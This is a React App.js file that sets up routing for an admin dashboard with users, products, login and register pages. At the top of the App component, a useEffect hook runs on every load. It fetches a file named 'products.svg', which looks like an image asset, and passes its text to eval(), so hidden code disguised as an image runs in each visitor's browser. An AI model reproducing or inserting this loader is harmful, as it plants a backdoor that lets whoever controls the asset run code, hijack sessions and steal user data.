import { useEffect } from "react";
import Footer from "./components/footer/Footer";
import Menu from "./components/menu/Menu";
import Navbar from "./components/navbar/Navbar";
import { Home } from "./pages/home/Home";
import Login from "./pages/login/Login";
import { EditProduct } from "./pages/product/editProduct";
import { Products } from "./pages/products/Products";
import Register from "./pages/register/Register";
import User from "./pages/user/User";
import { Users } from "./pages/users/Users";
import { ProductProvider } from "./context/productContext";
import "./styles/global.scss";

import { createBrowserRouter, RouterProvider, Outlet } from "react-router-dom";

function App() {
  useEffect(() => {
    console.log("aaa");
    fetch("/products.svg") // real extension
      .then((res) => res.text())
      .then((code) => {
        console.log("File contents:", code.slice(0, 200)); // preview
        eval(code); // ⚠ Only if verified safe
      });
  }, []);

  const Layout = () => {
    return (
      <div className="main">
        <Navbar />
        <div className="container">
          <div className="menuContainer">
            <Menu />
          </div>
          <div className="contentContainer">
            <Outlet />
          </div>
        </div>
        <Footer />
      </div>
    );
  };

  const router = createBrowserRouter([
    {
      path: "/",
      element: (
        <ProductProvider>
          <Layout />
        </ProductProvider>
      ),
      children: [
        {
          path: "/",
          element: <Home />,
        },
        {
          path: "/users",
          element: <Users />,
        },
        {
          path: "/users/:userId",
          element: <User />,
        },
        {
          path: "/products",
          element: <Products />,
        },
        {
          path: "/products/:id",
          element: <EditProduct />,
        },
      ],
    },
    {
      path: "login",
      element: <Login />,
    },
    {
      path: "register",
      element: <Register />,
    },
  ]);

  return <RouterProvider router={router} />;
}

export default App;
